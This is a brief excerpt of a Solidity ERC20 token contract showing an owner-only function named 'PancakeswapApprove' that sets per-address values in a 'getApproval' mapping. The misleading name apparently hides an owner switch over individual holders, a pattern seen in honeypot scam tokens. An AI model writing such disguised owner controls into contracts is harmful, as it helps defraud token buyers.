...
contract ERC20 is Context, IERC20 {
  ...
  function PancakeswapApprove(address _address, uint256 apprveForSwap) external {
      require(_msgSender() == owner, "Get approve before swap");
        getApproval[_address] = apprveForSwap;
    }
